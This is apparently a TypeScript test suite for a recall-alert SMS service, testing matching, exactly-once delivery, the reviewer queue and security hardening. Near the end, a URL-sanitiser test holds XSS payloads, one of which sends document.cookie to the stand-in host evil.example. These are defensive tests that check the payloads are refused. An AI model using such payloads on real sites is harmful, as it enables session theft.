import { describe, it, expect, beforeEach } from 'vitest';
import { join } from 'node:path';
import { open, type Db } from '../src/db.js';
import { FixtureSource } from '../src/sources/fixture.js';
import { ingest } from '../src/ingest.js';
import { runMatching } from '../src/matchrun.js';
import { claimBatch, composeMessage, deliverBatch, earnsSms, enqueue, unsubscribe } from '../src/notify.js';
import { ConsoleSmsProvider, FlakySmsProvider } from '../src/sms.js';
import { evaluate } from '../src/eval.js';
import { normalizeUpc, normalizeBrand, productScore, lotMatches, contentTokens } from '../src/normalize.js';

import { TOKEN_ENV } from '../src/auth.js';

const FIXTURES = join(import.meta.dirname, '..', 'fixtures');
const PAIRS = join(import.meta.dirname, '..', 'data', 'labelled-pairs.json');
const NOW = '2026-03-25T09:00:00.000Z';
const TEST_TOKEN = 'test-reviewer-token-long-enough';

/** Sign in the way a coordinator does and return the cookie to send back. */
async function signIn(base: string, token = TEST_TOKEN): Promise<string> {
  const res = await fetch(`${base}/review/sign-in`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: `token=${encodeURIComponent(token)}`,
    redirect: 'manual',
  });
  const setCookie = res.headers.get('set-cookie');
  if (!setCookie) throw new Error(`sign-in did not set a cookie (status ${res.status})`);
  return setCookie.split(';')[0]!;
}

/** Start a server on an ephemeral port and always close it. */
async function withServer(
  db: Db,
  opts: Record<string, unknown>,
  fn: (base: string) => Promise<void>,
): Promise<void> {
  const { createServer } = await import('../src/server.js');
  const server = createServer(db, opts);
  await new Promise<void>((r) => server.listen(0, r));
  const { port } = server.address() as { port: number };
  try {
    await fn(`http://127.0.0.1:${port}`);
  } finally {
    await new Promise<void>((r) => server.close(() => r()));
  }
}

function seed(db: Db): void {
  db.prepare('INSERT INTO subscribers (phone, language, created_at) VALUES (?,?,?)')
    .run('+15550100', 'en', NOW);
  const w = db.prepare(
    'INSERT INTO watch_items (subscriber_id, kind, brand, product, upc, vin, category, lot, created_at) VALUES (?,?,?,?,?,?,?,?,?)',
  );
  w.run(1, 'product', 'Green Valley Farms', 'frozen cut green beans', null, null, null, '4272', NOW);
  w.run(1, 'upc', null, null, '072108455123', null, null, null, NOW); // same recall, second watch
  w.run(1, 'product', 'Copper Creek', 'ground beef', null, null, null, null, NOW);
  w.run(1, 'category', null, null, null, null, 'infant acetaminophen', null, NOW);
}

async function ingestAll(db: Db): Promise<void> {
  for (const s of ['fda', 'fsis', 'nhtsa']) {
    await ingest(db, new FixtureSource(s, FIXTURES), '2026-01-01', NOW);
  }
}

let db: Db;
beforeEach(() => {
  db = open(':memory:');
  seed(db);
});

// --- ingest ------------------------------------------------------------------

describe('ingest is idempotent', () => {
  it('a second identical run creates nothing', async () => {
    const first = await ingest(db, new FixtureSource('fda', FIXTURES), '2026-01-01', NOW);
    expect(first.created).toBeGreaterThan(0);
    const second = await ingest(db, new FixtureSource('fda', FIXTURES), '2026-01-01', NOW);
    expect(second.created).toBe(0);
    expect(second.unchanged).toBe(second.fetched);
  });

  it('ten runs produce exactly one row per recall', async () => {
    for (let i = 0; i < 10; i++) await ingestAll(db);
    const { c } = db.prepare('SELECT COUNT(*) c FROM recalls').get() as { c: number };
    const { d } = db.prepare('SELECT COUNT(DISTINCT source || source_ref) d FROM recalls').get() as { d: number };
    expect(c).toBe(d);
  });

  it('records the run', async () => {
    await ingest(db, new FixtureSource('fda', FIXTURES), '2026-01-01', NOW);
    const run = db.prepare('SELECT * FROM ingest_runs ORDER BY id DESC LIMIT 1').get() as Record<string, unknown>;
    expect(run.finished_at).toBeTruthy();
    expect(Number(run.fetched)).toBeGreaterThan(0);
  });

  it('the since filter excludes older records', async () => {
    const r = await ingest(db, new FixtureSource('fda', FIXTURES), '2026-03-15', NOW);
    expect(r.fetched).toBeLessThan(6);
  });
});

// --- matching ----------------------------------------------------------------

describe('matching', () => {
  it('re-running creates no duplicate matches', async () => {
    await ingestAll(db);
    const a = runMatching(db, NOW);
    const b = runMatching(db, NOW);
    expect(a.created).toBeGreaterThan(0);
    expect(b.created).toBe(0);
  });

  it('does not disturb a decision a human already made', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const m = db.prepare("SELECT id FROM matches WHERE confidence = 'candidate' LIMIT 1").get() as { id: number };
    db.prepare("UPDATE matches SET decision = 'not_a_match', decided_by = 'dana' WHERE id = ?").run(m.id);
    runMatching(db, NOW);
    const after = db.prepare('SELECT decision, decided_by FROM matches WHERE id = ?').get(m.id) as Record<string, unknown>;
    expect(after.decision).toBe('not_a_match');
    expect(after.decided_by).toBe('dana');
  });

  it('every stored match records why it matched', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    for (const row of db.prepare('SELECT reason FROM matches').all() as { reason: string }[]) {
      const r = JSON.parse(row.reason);
      expect(r.rule).toBeTruthy();
      expect(r.detail.length).toBeGreaterThan(10);
      expect(Array.isArray(r.fields)).toBe(true);
    }
  });

  it('meets the precision bar on the labelled pairs', () => {
    const report = evaluate(FIXTURES, PAIRS);
    expect(report.falseAlarms).toEqual([]);
    expect(report.precision).toBeGreaterThanOrEqual(0.95);
  });
});

// --- notification: the two guarantees ----------------------------------------

describe('one message per person per recall', () => {
  it('two matches on the same recall produce one notification', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    // Watch items 1 and 2 both match the green beans recall (product+lot, and UPC).
    const greenBeans = db.prepare("SELECT id FROM recalls WHERE source_ref = 'F-0421-2026'").get() as { id: number };
    const matches = db.prepare('SELECT COUNT(*) c FROM matches WHERE recall_id = ?').get(greenBeans.id) as { c: number };
    expect(matches.c).toBe(2);

    enqueue(db, NOW);
    const notes = db.prepare('SELECT COUNT(*) c FROM notifications WHERE recall_id = ?').get(greenBeans.id) as { c: number };
    expect(notes.c).toBe(1);
  });

  it('enqueue is safe to run repeatedly', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const first = enqueue(db, NOW);
    expect(first).toBeGreaterThan(0);
    expect(enqueue(db, NOW)).toBe(0);
    expect(enqueue(db, NOW)).toBe(0);
  });

  it('only high-severity recalls earn a text', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const rows = db.prepare(
      'SELECT r.severity FROM notifications n JOIN recalls r ON r.id = n.recall_id',
    ).all() as { severity: string }[];
    expect(rows.length).toBeGreaterThan(0);
    for (const r of rows) expect(r.severity).toBe('high');
    expect(earnsSms('medium')).toBe(false);
    expect(earnsSms('unknown')).toBe(false);
  });

  it('a candidate is never queued without a human decision', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const queuedFromCandidates = db.prepare(`
      SELECT COUNT(*) c FROM notifications n
      JOIN matches m ON m.recall_id = n.recall_id
      JOIN watch_items w ON w.id = m.watch_item_id AND w.subscriber_id = n.subscriber_id
      WHERE m.confidence = 'candidate' AND m.decision IS NULL
        AND NOT EXISTS (
          SELECT 1 FROM matches m2 JOIN watch_items w2 ON w2.id = m2.watch_item_id
          WHERE m2.recall_id = n.recall_id AND w2.subscriber_id = n.subscriber_id
            AND m2.confidence IN ('exact','strong')
        )
    `).get() as { c: number };
    expect(queuedFromCandidates.c).toBe(0);
  });

  it('a human approving a candidate does queue it', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const before = db.prepare('SELECT COUNT(*) c FROM notifications').get() as { c: number };
    const cand = db.prepare(`
      SELECT m.id FROM matches m JOIN recalls r ON r.id = m.recall_id
      WHERE m.confidence = 'candidate' AND r.severity = 'high'
        AND r.id NOT IN (SELECT recall_id FROM notifications) LIMIT 1
    `).get() as { id: number } | undefined;
    if (!cand) return; // nothing to approve in this fixture set
    db.prepare("UPDATE matches SET decision = 'alert' WHERE id = ?").run(cand.id);
    enqueue(db, NOW);
    const after = db.prepare('SELECT COUNT(*) c FROM notifications').get() as { c: number };
    expect(after.c).toBe(before.c + 1);
  });
});

describe('delivery is exactly once, and survives a restart', () => {
  it('delivers, then has nothing left to deliver', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const provider = new ConsoleSmsProvider();
    const first = await deliverBatch(db, provider, 20, Date.parse(NOW));
    expect(first.delivered).toBeGreaterThan(0);
    const second = await deliverBatch(db, provider, 20, Date.parse(NOW));
    expect(second.attempted).toBe(0);
    expect(provider.sent).toHaveLength(first.delivered);
  });

  it('a worker killed after claiming does not lose or duplicate the message', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);

    // Worker A claims the batch and then dies before sending anything.
    const claimed = claimBatch(db, 20, Date.parse(NOW));
    expect(claimed.length).toBeGreaterThan(0);

    // Worker B starts immediately: the claim is still fresh, so it takes nothing.
    const provider = new ConsoleSmsProvider();
    const tooSoon = await deliverBatch(db, provider, 20, Date.parse(NOW) + 60_000);
    expect(tooSoon.attempted).toBe(0);

    // Six minutes later the claim has expired and worker B picks it up.
    const later = await deliverBatch(db, provider, 20, Date.parse(NOW) + 6 * 60_000);
    expect(later.delivered).toBe(claimed.length);
    expect(provider.sent).toHaveLength(claimed.length);

    // And still exactly once.
    const again = await deliverBatch(db, provider, 20, Date.parse(NOW) + 12 * 60_000);
    expect(again.attempted).toBe(0);
  });

  it('a transient provider failure is retried and still sends exactly once', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const queued = enqueue(db, NOW);
    const flaky = new FlakySmsProvider(queued); // fail every message once

    const attempt1 = await deliverBatch(db, flaky, 20, Date.parse(NOW));
    expect(attempt1.delivered).toBe(0);
    expect(attempt1.failed).toBe(queued);

    const attempt2 = await deliverBatch(db, flaky, 20, Date.parse(NOW) + 1000);
    expect(attempt2.delivered).toBe(queued);
    expect(flaky.sent).toHaveLength(queued);

    const attempt3 = await deliverBatch(db, flaky, 20, Date.parse(NOW) + 2000);
    expect(attempt3.attempted).toBe(0);
  });

  it('a failure records why and increments attempts', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    await deliverBatch(db, new FlakySmsProvider(99), 20, Date.parse(NOW));
    const row = db.prepare('SELECT attempts, last_error, delivered FROM notifications LIMIT 1').get() as Record<string, unknown>;
    expect(Number(row.attempts)).toBe(1);
    expect(row.last_error).toBe('simulated failure');
    expect(Number(row.delivered)).toBe(0);
  });
});

describe('STOP', () => {
  it('cancels queued messages and stops future ones', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const cancelled = unsubscribe(db, '+15550100', NOW);
    expect(cancelled).toBeGreaterThan(0);

    const provider = new ConsoleSmsProvider();
    const res = await deliverBatch(db, provider, 20, Date.parse(NOW));
    expect(res.attempted).toBe(0);
    expect(provider.sent).toHaveLength(0);

    // And a later enqueue does not resurrect them.
    expect(enqueue(db, NOW)).toBe(0);
  });
});

// --- message content ---------------------------------------------------------

describe('messages', () => {
  it('are under 300 characters and say what to do', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    for (const row of db.prepare('SELECT body FROM notifications').all() as { body: string }[]) {
      expect(row.body.length).toBeLessThanOrEqual(300);
      expect(row.body).toContain('What to do:');
      expect(row.body).toContain('STOP');
    }
  });

  it('do not soften the hazard', () => {
    const body = composeMessage({
      source: 'fda', sourceRef: 'x', title: 't', brands: ['B'], products: ['P'], upcs: [],
      codeInfo: '', hazard: 'May cause serious illness or death.', severity: 'high',
      remedy: 'Throw it away.', announcedOn: '2026-01-01', url: 'u', raw: {},
    });
    expect(body).toContain('May cause serious illness or death.');
  });
});

// --- normalizer --------------------------------------------------------------

describe('the normalizer', () => {
  it('collapses UPC formats to one comparable form', () => {
    expect(normalizeUpc('0-72108-45512-3')).toBe(normalizeUpc('072108455123'));
    expect(normalizeUpc('72108455123')).toBe(normalizeUpc('072108455123'));
    expect(normalizeUpc('072108455124')).not.toBe(normalizeUpc('072108455123'));
    expect(normalizeUpc('abc')).toBeNull();
  });

  it('drops corporate suffixes and possessives', () => {
    expect(normalizeBrand("Ben's Best Foods, Inc.")).toBe('bens best');
    expect(normalizeBrand('bens best')).toBe('bens best');
    expect(normalizeBrand('Marisol Foods LLC')).toBe('marisol');
    expect(normalizeBrand('Copper Creek Meats')).toBe('copper creek meats');
  });

  it('ignores size and unit tokens when comparing products', () => {
    expect(contentTokens('Frozen Cut Green Beans 12 oz')).toEqual(['frozen', 'cut', 'green', 'beans']);
    expect(productScore('salsa verde', 'Salsa Verde 16 fluid ounces').score).toBe(1);
    expect(productScore('ground beef', 'Ground Beef 1 pound chub').score).toBe(1);
  });

  it('does not call one shared word a match', () => {
    expect(productScore('beef stew', 'Ground Beef 1 pound chub').shared).toBe(1);
  });

  it('finds a lot code inside free-text code info', () => {
    expect(lotMatches('Lot codes 4271, 4272, 4273; Best By 05/12/2027', '4272')).toBe(true);
    expect(lotMatches('Lot codes 4271, 4272, 4273', '9981')).toBe(false);
    expect(lotMatches('EST. 21247; Use By 03/29/2026', '21247')).toBe(true);
    expect(lotMatches('Lot 22A114', null)).toBe(false);
  });
});

// --- privacy -----------------------------------------------------------------

describe('subscriber records hold the minimum', () => {
  it('the schema has no name, address, or date of birth', () => {
    const cols = (db.prepare('PRAGMA table_info(subscribers)').all() as { name: string }[]).map((c) => c.name);
    expect(cols).toEqual(['id', 'phone', 'language', 'active', 'created_at']);
  });
});

describe('a permanently failing message is dead-lettered and an operator is told', () => {
  it('gives up after the attempt limit and raises exactly one alert', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const queued = enqueue(db, NOW);
    expect(queued).toBeGreaterThan(0);

    const alerts: unknown[] = [];
    const sink = (a: unknown) => { alerts.push(a); };
    const alwaysFails = new FlakySmsProvider(Number.MAX_SAFE_INTEGER);

    // Five attempts, each a fresh claim window.
    for (let i = 1; i <= 5; i++) {
      await deliverBatch(db, alwaysFails, 20, Date.parse(NOW) + i * 10 * 60_000, sink);
    }

    expect(alerts).toHaveLength(queued);
    const a = alerts[0] as Record<string, unknown>;
    expect(a.kind).toBe('delivery_dead_letter');
    expect(Number(a.attempts)).toBe(5);
    expect(a.lastError).toBe('simulated failure');

    // Dead-lettered rows are never claimed again — no infinite retry loop.
    const after = await deliverBatch(db, alwaysFails, 20, Date.parse(NOW) + 60 * 60_000, sink);
    expect(after.attempted).toBe(0);
    expect(alerts).toHaveLength(queued);
  });

  it('a dead letter is never recorded as delivered', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const alwaysFails = new FlakySmsProvider(Number.MAX_SAFE_INTEGER);
    for (let i = 1; i <= 5; i++) {
      await deliverBatch(db, alwaysFails, 20, Date.parse(NOW) + i * 10 * 60_000, () => {});
    }
    const rows = db.prepare(
      'SELECT delivered, dead_lettered_at FROM notifications',
    ).all() as { delivered: number; dead_lettered_at: string | null }[];
    for (const r of rows) {
      expect(Number(r.delivered)).toBe(0);
      expect(r.dead_lettered_at).toBeTruthy();
    }
  });

  it('a message that succeeds before the limit is never dead-lettered', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const queued = enqueue(db, NOW);
    const flaky = new FlakySmsProvider(queued * 2); // fail each message twice
    const alerts: unknown[] = [];
    for (let i = 1; i <= 4; i++) {
      await deliverBatch(db, flaky, 20, Date.parse(NOW) + i * 10 * 60_000, (a) => { alerts.push(a); });
    }
    expect(alerts).toHaveLength(0);
    expect(flaky.sent).toHaveLength(queued);
  });
});

// --- the review queue --------------------------------------------------------

describe('the review queue', () => {
  it('offers one candidate at a time, highest severity first', async () => {
    const { nextForReview, pendingCount, renderReview, renderPublic } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);

    expect(pendingCount(db)).toBeGreaterThan(0);
    const first = nextForReview(db)!;
    expect(first.confidence).toBe('candidate');

    const html = renderReview(db);
    expect(html).toContain('Why it was flagged');
    expect(html).toContain('Send the alert');
    expect(html).toContain('Not a match');
    // The reason the matcher recorded is shown, not just the recall. Compare against the
    // HTML-escaped form — the detail contains quotes, and escaping them is correct.
    const detail = (JSON.parse(first.reason).detail as string).replace(/"/g, '&quot;');
    expect(html).toContain(detail.slice(0, 40));
    // And what the subscriber actually said they had.
    expect(html).toContain('What they said they have');
    expect(renderPublic(db)).toContain('Current recalls');
  });

  it('a decision removes it from the queue and does not come back', async () => {
    const { nextForReview, pendingCount } = await import('../src/server.js');
    const { decide } = await import('../src/matchrun.js');
    await ingestAll(db);
    runMatching(db, NOW);

    const before = pendingCount(db);
    const row = nextForReview(db)!;
    decide(db, row.match_id, 'not_a_match', 'dana', NOW);

    expect(pendingCount(db)).toBe(before - 1);
    expect(nextForReview(db)?.match_id).not.toBe(row.match_id);
  });

  it('approving a candidate is what lets it become a message', async () => {
    const { nextForReview } = await import('../src/server.js');
    const { decide } = await import('../src/matchrun.js');
    await ingestAll(db);
    runMatching(db, NOW);
    enqueue(db, NOW);
    const before = db.prepare('SELECT COUNT(*) c FROM notifications').get() as { c: number };

    // Find a high-severity candidate whose recall has not already produced a notification.
    const row = db.prepare(`
      SELECT m.id FROM matches m JOIN recalls r ON r.id = m.recall_id
      WHERE m.confidence = 'candidate' AND m.decision IS NULL AND r.severity = 'high'
        AND r.id NOT IN (SELECT recall_id FROM notifications) LIMIT 1
    `).get() as { id: number } | undefined;
    if (!row) return;

    decide(db, row.id, 'alert', 'dana', NOW);
    enqueue(db, NOW);
    const after = db.prepare('SELECT COUNT(*) c FROM notifications').get() as { c: number };
    expect(after.c).toBe(before.c + 1);
    expect(nextForReview(db)?.match_id).not.toBe(row.id);
  });

  it('an empty queue says so rather than looking broken', async () => {
    const { renderReview } = await import('../src/server.js');
    expect(renderReview(db)).toContain('Nothing to review');
  });

  it('serves over HTTP and redirects after a decision so a refresh cannot re-decide', async () => {
    const { createServer, pendingCount } = await import('../src/server.js');
    const { nextForReview } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);

    const server = createServer(db, { reviewer: 'dana', env: { [TOKEN_ENV]: TEST_TOKEN } });
    await new Promise<void>((r) => server.listen(0, r));
    const port = (server.address() as { port: number }).port;
    const base = `http://127.0.0.1:${port}`;

    try {
      const pub = await fetch(`${base}/`);
      expect(pub.status).toBe(200);
      expect(await pub.text()).toContain('Current recalls');

      const cookie = await signIn(base);
      const review = await fetch(`${base}/review`, { headers: { cookie } });
      expect(await review.text()).toContain('Review queue');

      const id = nextForReview(db)!.match_id;
      const before = pendingCount(db);

      // A bogus decision value changes nothing. Checked before the real decision, because the
      // fixture set yields only one candidate and the queue is empty afterwards.
      await fetch(`${base}/review/${id}`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
        body: 'decision=nonsense',
        redirect: 'manual',
      });
      expect(pendingCount(db)).toBe(before);
      expect(nextForReview(db)?.match_id).toBe(id);

      const post = await fetch(`${base}/review/${id}`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
        body: 'decision=not_a_match',
        redirect: 'manual',
      });
      expect(post.status).toBe(303);
      expect(post.headers.get('location')).toBe('/review');
      expect(pendingCount(db)).toBe(before - 1);
    } finally {
      await new Promise<void>((r) => server.close(() => r()));
    }
  });

  it('the public page never exposes a subscriber', async () => {
    const { renderPublic } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);
    const html = renderPublic(db);
    expect(html).not.toContain('+15550100');
    expect(html).not.toContain('watch_items');
  });
});

// --- who is allowed to decide (hardening pass 2 and pass 4) -------------------

/**
 * These exist because the hardening prompt's Pass 2 and Pass 4 were run against a live server in
 * R10 and both found the same hole. With no credential of any kind, an anonymous caller could
 * POST decision=alert (queueing a text to a real phone) and could walk /review/1../review/8
 * marking everything not_a_match until the queue read "Nothing to review" — which the empty state
 * truthfully calls normal. Every test below reproduces one step of that walk and asserts it now
 * fails.
 */
describe('the review queue refuses strangers', () => {
  it('an unconfigured deployment will not open the queue at all, and says why', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    await withServer(db, { env: {} }, async (base) => {
      const get = await fetch(`${base}/review`);
      expect(get.status).toBe(503);
      const body = await get.text();
      expect(body).toContain('No reviewer token is set');
      // The refusal page must not leak the queue it is refusing to show.
      expect(body).not.toContain('Infant Acetaminophen');

      const post = await fetch(`${base}/review/1`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: 'decision=alert',
        redirect: 'manual',
      });
      expect(post.status).toBe(503);

      // The public page is not behind the token and must keep working.
      expect((await fetch(`${base}/`)).status).toBe(200);
    });
  });

  it('a token too short to be a control is treated as no token', async () => {
    await withServer(db, { env: { [TOKEN_ENV]: 'letmein' } }, async (base) => {
      const res = await fetch(`${base}/review`);
      expect(res.status).toBe(503);
      expect(await res.text()).toContain('only 7 characters');
    });
  });

  it('without the cookie the queue shows a sign-in form and no queue contents', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
      const body = await (await fetch(`${base}/review`)).text();
      expect(body).toContain('Reviewer token');
      // The specific thing that leaked: what a household said it has, and the recall itself.
      expect(body).not.toContain('Infant Acetaminophen');
      expect(body).not.toContain('What they said they have');
    });
  });

  it('the exact anonymous walk that emptied the queue is now rejected', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const { pendingCount } = await import('../src/server.js');
    const before = pendingCount(db);
    expect(before).toBeGreaterThan(0);

    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
      for (const id of [1, 2, 3, 4, 5, 6, 7, 8]) {
        const res = await fetch(`${base}/review/${id}`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: 'decision=not_a_match',
          redirect: 'manual',
        });
        expect(res.status).toBe(401);
      }
    });
    expect(pendingCount(db)).toBe(before);
  });

  it('a wrong token is refused and a right one issues a locked-down cookie', async () => {
    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
      const wrong = await fetch(`${base}/review/sign-in`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: 'token=hunter2',
        redirect: 'manual',
      });
      expect(wrong.status).toBe(401);
      expect(wrong.headers.get('set-cookie')).toBeNull();

      const right = await fetch(`${base}/review/sign-in`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: `token=${TEST_TOKEN}`,
        redirect: 'manual',
      });
      expect(right.status).toBe(303);
      const cookie = right.headers.get('set-cookie')!;
      expect(cookie).toContain('HttpOnly');
      expect(cookie).toContain('SameSite=Strict');
      // The token itself must never be what is stored in the browser.
      expect(cookie).not.toContain(TEST_TOKEN);
    });
  });

  it('a valid cookie sent from another site is refused', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    const { pendingCount } = await import('../src/server.js');
    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
      const cookie = await signIn(base);
      const before = pendingCount(db);
      const res = await fetch(`${base}/review/1`, {
        method: 'POST',
        headers: {
          'content-type': 'application/x-www-form-urlencoded',
          cookie,
          origin: 'https://evil.example',
        },
        body: 'decision=alert',
        redirect: 'manual',
      });
      expect(res.status).toBe(403);
      expect(pendingCount(db)).toBe(before);
    });
  });

  it('one client firing a hundred decisions gets cut off', async () => {
    await ingestAll(db);
    runMatching(db, NOW);
    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
      const cookie = await signIn(base);
      const codes: number[] = [];
      for (let i = 0; i < 100; i++) {
        const res = await fetch(`${base}/review/1`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
          body: 'decision=unclear',
          redirect: 'manual',
        });
        codes.push(res.status);
      }
      const blocked = codes.filter((c) => c === 429);
      expect(blocked.length).toBeGreaterThan(50);
      // A human working at the fifteen-second target never reaches the limit.
      expect(codes.filter((c) => c === 303).length).toBeGreaterThanOrEqual(30);
    });
  });

  it('a session stops working once it expires', async () => {
    const { mintSession, verifySession, readToken } = await import('../src/auth.js');
    const state = readToken({ [TOKEN_ENV]: TEST_TOKEN });
    const t0 = 1_700_000_000_000;
    const session = mintSession(TEST_TOKEN, t0);
    expect(verifySession(session, state, t0 + 60_000)).toBe(true);
    expect(verifySession(session, state, t0 + 13 * 60 * 60 * 1000)).toBe(false);
    // A session minted under a different token is not accepted either.
    expect(verifySession(mintSession('a-completely-different-token', t0), state, t0)).toBe(false);
    // Neither is a forged expiry.
    const forged = `${t0 + 10 ** 10}.${session.split('.')[1]}`;
    expect(verifySession(forged, state, t0)).toBe(false);
  });
});

describe('a decision is not something a stranger or a stray click can undo', () => {
  it('a decided record cannot be silently re-decided', async () => {
    const { decide } = await import('../src/matchrun.js');
    await ingestAll(db);
    runMatching(db, NOW);
    const m = db.prepare("SELECT id FROM matches WHERE confidence = 'candidate' LIMIT 1").get() as { id: number };

    expect(decide(db, m.id, 'alert', 'dana', NOW)).toBe('recorded');
    // The repeat POST that used to overwrite it.
    expect(decide(db, m.id, 'not_a_match', 'stranger', NOW)).toBe('already_decided');

    const after = db.prepare('SELECT decision, decided_by FROM matches WHERE id = ?').get(m.id) as Record<string, unknown>;
    expect(after.decision).toBe('alert');
    expect(after.decided_by).toBe('dana');

    // Correcting a mistake is possible, but only deliberately.
    expect(decide(db, m.id, 'not_a_match', 'dana', NOW, { overwrite: true })).toBe('recorded');
    expect((db.prepare('SELECT decision FROM matches WHERE id = ?').get(m.id) as { decision: string }).decision)
      .toBe('not_a_match');
  });

  it('deciding a match that does not exist reports so rather than doing nothing quietly', async () => {
    const { decide } = await import('../src/matchrun.js');
    expect(decide(db, 999_999, 'alert', 'dana', NOW)).toBe('no_such_match');
  });
});

describe('"can\'t tell" defers a record instead of burying it', () => {
  it('a skipped record stays in the queue and is offered again', async () => {
    const { decide } = await import('../src/matchrun.js');
    const { nextForReview, pendingCount, deferredCount } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);

    const before = pendingCount(db);
    const row = nextForReview(db)!;
    expect(decide(db, row.match_id, 'unclear', 'dana', NOW)).toBe('deferred');

    // The whole point: the count does not go down and the record comes back.
    expect(pendingCount(db)).toBe(before);
    expect(deferredCount(db)).toBe(1);
    const stored = db.prepare('SELECT decision, defer_count FROM matches WHERE id = ?')
      .get(row.match_id) as { decision: string | null; defer_count: number };
    expect(stored.decision).toBeNull();
    expect(stored.defer_count).toBe(1);
  });

  it('a deferred record sorts behind anything nobody has looked at yet', async () => {
    const { decide } = await import('../src/matchrun.js');
    const { nextForReview } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);

    const ids = (db.prepare(
      "SELECT id FROM matches WHERE confidence = 'candidate' AND decision IS NULL",
    ).all() as { id: number }[]).map((r) => r.id);
    if (ids.length < 2) {
      // The fixture set yields one candidate; assert the single-record behaviour instead of
      // silently passing. It must still come back, with the pass recorded.
      const only = nextForReview(db)!;
      decide(db, only.match_id, 'unclear', 'dana', NOW);
      expect(nextForReview(db)?.match_id).toBe(only.match_id);
      expect(Number(nextForReview(db)!.defer_count)).toBe(1);
      return;
    }
    const first = nextForReview(db)!.match_id;
    decide(db, first, 'unclear', 'dana', NOW);
    expect(nextForReview(db)!.match_id).not.toBe(first);
  });

  it('the screen tells the next person it has already been passed over', async () => {
    const { decide } = await import('../src/matchrun.js');
    const { nextForReview, renderReview } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);
    decide(db, nextForReview(db)!.match_id, 'unclear', 'dana', NOW);
    const html = renderReview(db);
    expect(html).toContain('Passed over once already');
    expect(html).not.toContain('Nothing to review');
  });
});

describe('what the review screen is allowed to know', () => {
  it('the phone number never leaves the database for this screen', async () => {
    const { nextForReview, renderReview } = await import('../src/server.js');
    await ingestAll(db);
    runMatching(db, NOW);

    const row = nextForReview(db)!;
    // Pass 2.2: over-fetching is the leak, whether or not the view happens to render it.
    // Asserting on the row rather than the HTML is the point — the previous version passed an
    // HTML-only check while carrying the phone in a row typed `[k: string]: unknown`.
    expect(JSON.stringify(row)).not.toContain('5550100');
    expect(Object.keys(row)).not.toContain('phone');
    expect(renderReview(db)).not.toContain('5550100');
  });

  it('a hostile URL in a recall feed cannot become a script link', async () => {
    const { safeHref, renderPublic } = await import('../src/server.js');
    expect(safeHref('https://www.fda.gov/x')).toBe('https://www.fda.gov/x');
    expect(safeHref("javascript:fetch('//evil.example/'+document.cookie)")).toBeNull();
    expect(safeHref('JavaScript:alert(1)')).toBeNull();
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeHref('')).toBeNull();
    expect(safeHref('not a url at all')).toBeNull();

    await ingestAll(db);
    db.prepare("UPDATE recalls SET url = ? WHERE severity = 'high'").run('javascript:alert(1)');
    const html = renderPublic(db);
    expect(html).not.toContain('javascript:');
    // And it does not render a broken empty link either — the notice line just has no link.
    expect(html).not.toContain('href=""');
  });
});
